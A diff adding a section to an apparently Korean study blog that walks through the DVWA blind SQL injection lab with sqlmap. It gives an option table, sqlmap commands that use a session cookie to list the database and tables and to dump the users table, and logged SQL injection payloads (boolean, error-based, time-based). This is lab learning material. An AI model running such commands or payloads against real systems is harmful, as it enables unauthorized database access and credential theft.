@@ -464,7 +464,97 @@ $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
 
 일일이 하기에는 시간이 너무 오래 걸릴 것 같아서 코드를 짜서 풀려고 한다.  
 이 부분은 내일 완전히 집중해서 만들어 보아야겠다.  
-절대 "범죄도시2" 가 보고 싶어서는 아니다.
+~~절대 "범죄도시2" 가 보고 싶어서는 아니다.~~
+
+직접 코드를 짜려던 순간에 이전에 찜해두었던 [sqlmap](https://jminis.github.io/docs/P4C/Day25/#-%ED%95%9C%EB%B2%88-%EC%95%8C%EC%95%84%EB%B3%B4%EC%95%98%EC%8A%B5%EB%8B%88%EB%8B%A4)이 생각났다. 한번 해보려고 한다.
+
+```shell
+sudo apt install sqlmap
+```
+
+설치는 아주 simple하다.
+
+<br>
+
+| 옵션                | 설명                                                         |
+| ------------------- | ------------------------------------------------------------ |
+| -u [URL]            | DB 정보가 존재하는 웹 페이지의 URL 정보                      |
+| --cookie            | HTTP 통신 시 사용되는 쿠키 헤더 값 (로그인해서 풀어야 하는 문제일 경우) |
+| -p [파라미터값]     | 전달하는 인자명 (ex. id,pw ...)                              |
+| --current-db        | 현재 데이터베이스 출력                                       |
+| --dbs               | 데이터베이스 목록 찾기                                       |
+| --tables            | 테이블 목록 찾기                                             |
+| --columns           | 컬럼 목록 찾기                                               |
+| -D [데이터베이스명] | 특정 데이터 베이스 대상 탐색                                 |
+| -T [테이블명]       | 특정 테이블 대상 탐색                                        |
+| -C [컬럼명]         | 특정 컬럼 대상 탐색                                          |
+| --dump              | 덤프를                                                       |
+
+<br>
+
+가장 기본적인 sqlmap 구문을 사용해보자
+
+```bash
+sqlmap -u "http://192.168.3.128/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=mgf249ms3gbccu03eppvk3vuic; security=low"
+```
+
+![image-20220522150244289](../img/image-20220522150244289.png)
+
+y 만 눌러주면 자기 혼자 다 해버리더니 취약한 부분을 탐색해주었다
+
+```
+minishell@ubuntu:~/.sqlmap/output/192.168.3.128$ cat log
+sqlmap identified the following injection point(s) with a total of 3426 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 5411=5411 AND 'ixmN'='ixmN&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+Payload: id=1' AND (SELECT 9281 FROM(SELECT COUNT(*),CONCAT(0x7178707a71,(SELECT (ELT(9281=9281,1))),0x71716a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'IHMZ'='IHMZ&Submit=Submit
+    
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 4101 FROM (SELECT(SLEEP(5)))pSGC) AND 'fmpx'='fmpx&Submit=Submit
+---
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+```
+
+앞서 sql 문제를 풀듯이 단계별로 알아나가보자.
+1.데이터베이스의 이름 확인하기
+
+```bash
+sqlmap -u "http://192.168.3.128/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=mgf249ms3gbccu03eppvk3vuic; security=low" --current-db
+```
+![image-20220522150945304](../img/image-20220522150945304.png)
+
+<br>
+
+2.테이블의 이름 확인하기
+```bash
+sqlmap -u "http://192.168.3.128/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=mgf249ms3gbccu03eppvk3vuic; security=low" -D dvwa --tables
+```
+
+![image-20220522151118628](../img/image-20220522151118628.png)
+
+<br>
+
+3.컬럼 정보 확인하기
+
+```bash
+sqlmap -u "http://192.168.3.128/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=mgf249ms3gbccu03eppvk3vuic; security=low" -D dvwa -T users --dump
+```
+
+![image-20220522151532244](../img/image-20220522151532244.png)
+
+명령어 3줄로 크랙이 완료되었다. 정말 어마어마한 툴 인 듯하다.  
+해당 과정 중에서 4 개의 질의가 있었는데 가장 빨리 끝날 수 있도록 기초적인 설정만 했다.
+
+
+
+
 
 <br><br><br>
 
